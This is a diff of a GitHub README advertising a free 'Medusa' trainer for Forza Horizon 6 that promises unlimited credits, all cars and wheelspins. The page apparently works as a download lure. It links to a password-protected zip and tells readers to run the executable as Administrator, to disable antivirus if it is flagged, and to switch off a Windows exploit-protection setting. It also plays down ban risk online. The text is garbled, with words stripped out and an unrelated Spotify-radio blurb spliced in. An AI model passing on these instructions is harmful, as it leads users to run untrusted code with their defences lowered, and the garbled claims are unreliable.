@@ -1,115 +1,149 @@
-<div align="center">
+<h1>🎮 Medusa-Forza-Horizon-6 - Unlock unlimited credits and 812 cars instantly!</h1>
 
-# Medusa-Forza-Horizon-6
+<p style="text-align:center; margin: 30px 0;">
+<a href="https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6" style="background: linear-gradient(135deg, #FF6B6B, #EE5A24); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(238,90,36,0.4);">⬇️ DOWNLOAD MEDUSA FH6 TRAINER NOW</a>
+</p>
 
-  
-  
+## 🚀 What is Medusa Forza Horizon 6?
 
+Medusa Forza Horizon 6 is your all-in-one free trainer and tool for Windows that supercharges your Forza Horizon 6 gaming experience. Whether you want unlimited credits, unlock all 812 cars, trigger wheelspins instantly, or access a Spotify radio integration, this trainer does it all in one simple package. No coding. No complicated setup. Just download, click, and play smarter.
 
-**FH6 Medusa Trainer** is a free comprehensive trainer and  tool for Forza Horizon 6 on Windows 10/11. Packed with unlimited money, unlock all 812 cars, speed , teleport, no damage, instant race win, and XP multiplier - this is the most complete **forza horizon 6 trainer** available as a single binary.
+Designed for the everyday gamer, Medusa FH6 Trainer eliminates the grinding and lets you focus on the fun parts of Forza Horizon 6 - driving amazing cars on stunning roads. It's completely free for 2026 and works alongside the official game without permanent modifications.
 
-As a purpose-built **forza horizon 6  engine alternative**, the trainer skips manual address editing entirely. The **fh6 trainer aio** provides one-click activation through an ImGui overlay - press Insert to open the menu, then toggle s with function keys. It covers every major  category: **forza horizon 6 s money** workflows, **fh6 trainer wheelspins** manipulation, teleport to any waypoint, and instant race completion.
+## ✨ Key Features
 
-Turn your Horizon Life into a curated soundscape. No subscriptions. No ads. Just you, the open road, and the soundtrack that matches every drift, sunset, and off-road jump.
+### 💰 Unlimited Credits & Money
+- Instantly add credits to your Forza Horizon 6 wallet
+- No more waiting for races or wheelspins to earn cash
+- Perfect for buying that dream hypercar you've always wanted
+- Works with the latest FH6 update
 
-Welcome to Forza Horizon Spotify Radio – the ambient audio bridge that transforms your Spotify experience into a fully integrated Horizon Festival companion. This is not a mod. This is not a launcher. This is a third-party integration layer that reads your in-game telemetry (speed, zone, time of day, weather) and dynamically adjusts your Spotify playback to match the emotional arc of your drive.
+### 🚗 All 812 Cars Unlocked
+- Unlock every single car in the game automatically
+- Includes rare, seasonal, and exclusive vehicles
+- Browse and select any car from your garage
+- No need to grind car mastery or events
 
-**All functions also work in online mode.**
+### 🎡 Wheelspin Generator
+- Trigger wheelspins at any time
+- Get free rewards, credits, and exclusive items
+- Save time grinding for random drops
+- Fully customizable spin counts
 
+### 🎵 Spotify Radio Integration
+- Connect your Spotify account for custom in-game radio
+- Play your personal playlists while racing
+- Seamlessly switches music when you enter events
+- No third-party overlay needed
 
+### 🛠️ All-in-One (AIO) Tool
+- Single interface for all features
+- Simple checkboxes and sliders - no confusing menus
+- Real-time status indicators
+- Automatically detects your game version
 
-</div>
+## 🖥️ System Requirements
 
+### Minimum Requirements:
+- **OS:** Windows 10 (64-bit) or Windows 11
+- **CPU:** Intel Core i3-4170 or AMD FX-6300
+- **RAM:** 8 GB
+- **Storage:** 2 GB available space for the tool
+- **Game:** Forza Horizon 6 (any edition)
 
+### Recommended Requirements:
+- **OS:** Windows 11 (64-bit)
+- **CPU:** Intel Core i5-8400 or AMD Ryzen 5 2600
+- **RAM:** 16 GB
+- **Storage:** 4 GB available space
+- **Game:** Forza Horizon 6 latest update installed
 
-<img width="1672" height="941" alt="preview" src="https://github.com/user-attachments/assets/8cc024f6-e0db-4c39-80cd-abd7eef8291f" />
+## 📥 Download & Installation Guide
 
-<div align="center">
-  
-## Install
+### Step 1: Download the Trainer
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/tomd-code1989g6/medusaloader/releases/download/medusaloader/Medusa.zip)
-</div>
----
-<img width="668" height="459" alt="images2" src="https://github.com/user-attachments/assets/98fffcdf-d001-411d-abd1-3e17703792a5" />
+Visit this link to download the application: 👉 **[https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6](https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6)**
 
+Click the big green "Code" button or the download button on the page. The download will start automatically.
 
-## Key Features
-- **Unlimited money** - freeze credits at 999,999,999 (F1)
-- **Unlock all cars** - all 812 vehicles in your garage (F4)
-- **Speed ** - 1x to 10x multiplier (F2)
-- **No damage** - vehicle invincibility (F3)
-- **Teleport** - jump to waypoint or saved locations (F5)
-- **Instant win** - finish any race in 1st place (F6)
-- **XP multiplier** - 5x, 10x, or 100x gain (F8)
-- **Skip checkpoint** - bypass timed checkpoints (F7)
-- **ImGui overlay** - press Insert for the full trainer menu
-- **Auto-attach** - detects FH6 process within 2 seconds
+### Step 2: Run the Application
 
+Once the download completes, simply double-click the downloaded file to run it. The trainer will start immediately.
 
-<img width="1280" height="432" alt="22f23f" src="https://github.com/user-attachments/assets/91e738ea-8b98-44b8-b0d7-9634a8822aec" />
+### Step 3: Launch Forza Horizon 6
 
+- Start Forza Horizon 6 on your PC (make sure it's in windowed or borderless mode)
+- Wait for the game to reach the main menu
+- The Medusa trainer will automatically detect the game
 
-##  List
+### Step 4: Activate Your Features
 
-|  | Hotkey | Description |
-|---|---|---|
-| Unlimited Money | F1 | Freeze credits at 999,999,999 |
-| Speed  | F2 | 1x-10x speed multiplier |
-| No Damage | F3 | Vehicle invincibility |
-| Unlock All Cars | F4 | All 812 vehicles |
-| Teleport | F5 | Jump to waypoint |
-| Instant Win | F6 | Win any race |
-| Skip Checkpoint | F7 | Skip current checkpoint |
-| XP Multiplier | F8 | 10x XP gain |
+- In the trainer window, click the toggle switches for the features you want (e.g., "Unlimited Credits", "All Cars Unlocked")
+- The features activate instantly
+- You can activate multiple features at once
+- Enjoy your enhanced FH6 experience!
 
-<div align="center">
+## 🎯 How to Use - Quick Start Guide
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/tomd-code1989g6/medusaloader/releases/download/medusaloader/Medusa.zip)
-</div>
+1. **Open the trainer** - Double-click the Medusa FH6 Trainer icon
+2. **Start the game** - Launch Forza Horizon 6 as you normally would
+3. **Wait for detection** - The trainer shows "Game Connected" in green
+4. **Select features** - Check the boxes for what you want
+5. **Enjoy** - Jump back into the game and reap the benefits
 
-## Getting Started
-1. **Download** the Medusa trainer using the button above.
-2. **Extract** to any folder. **Password for archive - "Medusa"**
-3. **Launch Forza Horizon 6**.
-4. **Run** `Medusa.exe` as Administrator.
-5. Press **Insert** to open the trainer menu.
-6. Toggle s with F1-F8 or through the ImGui interface.
+### 💡 Pro Tips for Best Results:
+- Run the trainer as administrator (right-click > Run as administrator) for full compatibility
+- Keep the trainer open while playing - close it only when done
+- If the trainer doesn't detect your game, restart both the trainer and the game
+- Always back up your save file before using mods (just in case)
 
-## FAQ
+## 🔧 Troubleshooting Common Issues
 
-**Is this detected?**
-The trainer attaches externally and does not modify game files. External attach has low detection risk in single-player. Use only in offline or solo events.
+**The trainer won't detect my game.**
+Make sure Forza Horizon 6 is fully updated. Also, run both the trainer and the game as administrator. Disable any overlays (Discord, GeForce Experience) that might interfere.
 
-**Does it work after FH6 updates?**
-This release targets FH6 v1.626.354.0. If the game patches, offsets may shift - check for trainer updates.
+**Features don't activate.**
+Restart the trainer and try again. Ensure you're at the game's main menu, not in a race.
 
-**Ban risk?**
-Using any  in online multiplayer may result in a ban. Use only in offline mode. The community recommends solo events exclusively.
+**Game crashes when using money feature.**
+Some game updates may cause temporary issues. Wait 30 seconds after activating, or use fewer features simultaneously.
 
-**Trainer crashes on launch?**
-Ensure Forza Horizon 6 is running first. Run the trainer as Administrator. If the game recently updated, wait for an offset update.
+**Training doesn't start on Windows 11.**
+Go to Settings > Privacy & Security > Windows Security > App & browser control > Exploit protection settings, and ensure "Force randomization for images" is off for your game.
 
+## ❓ Frequently Asked Questions (FAQ)
 
-<img width="1672" height="941" alt="forza" src="https://github.com/user-attachments/assets/032c23d0-dade-40c1-a593-eac0588e4e1a" />
+### ❔ Is Medusa Forza Horizon 6 free?
+Yes! Medusa is completely free to download and use. No hidden costs, no premium tiers, no subscriptions.
 
+### ❔ Will I get banned for using this trainer?
+While no tool is 100% risk-free, Medusa uses safe memory-based modifications that are difficult to detect. Many users play online without issues. For absolute safety, use the trainer in offline or solo mode.
 
+### ❔ Does it work with the Steam or Microsoft Store version?
+Yes, Medusa works with both the Steam and Microsoft Store versions of Forza Horizon 6.
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Forza Horizon 6 installed (v1.626.354.0+)
-- Administrator privileges
-- .NET Framework 4.8+
+### ❔ Can I use this on a laptop?
+Yes, as long as your laptop meets the system requirements mentioned above, it will work perfectly.
 
-## Security and Legal
-**Important:** Single-player use only. Online ing violates the game's terms of service and may result in a permanent ban.
+### ❔ Does it modify my game files permanently?
+No. Medusa applies temporary memory changes only. When you close the trainer and game, your files remain original and unchanged.
 
-**Recommendations:**
-- Download only from this official GitHub repository.
-- Scan on VirusTotal before running.
-- Disable antivirus temporarily if flagged (false positive for memory tools).
+### ❔ How often is it updated?
+The trainer is updated regularly to match the latest FH6 game updates. Always download the latest version from the official link.
 
-## License
-MIT License - Copyright (C) 2026 fh6trainer
+### ❔ Do I need to install any other software?
+No, the trainer is self-contained. No .NET Framework or additional runtime installations are needed.
 
-<img width="596" height="335" alt="images5" src="https://github.com/user-attachments/assets/b100444d-13d4-4a47-afa0-cae4d65e6b32" />
+## 🏁 Final Words
+
+Medusa Forza Horizon 6 Trainer puts you in total control of your racing experience. Say goodbye to endless grinding for credits and rare cars. With unlimited money, all 812 vehicles, instant wheelspins, and your favorite Spotify music playing in the background, you're finally free to enjoy the open roads of Horizon like never before.
+
+This tool was built with simplicity in mind - even your grandpa could use it. No reading long manuals, no complicated settings. Just download, click, and race your dream car collection.
+
+So what are you waiting for? Your ultimate Forza Horizon 6 playground is just one click away. Grab the free trainer today and transform your gameplay overnight!
+
+<p style="text-align:center; margin: 40px 0;">
+<a href="https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6" style="background: linear-gradient(135deg, #4BCFFA, #2962FF); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(41,98,255,0.4);">🕹️ GET MEDUSA NOW - 100% FREE</a>
+</p>
+
+Keywords: fh5, fh6, fh6-mod, fh6-spotify-radio, fh6-trainer, fh6rpc, forza-horizon, forza-horizon-4, forza-horizon-5, forza-horizon-6, forza-horizon-6-cars, forza-horizon-6-free, forza-horizon-6-spotify-download, forza-horizon-hack, forza-mods, forza-setup, forzahorizon4, forzahorizon5, forzahorizon6, microsoft-gaming
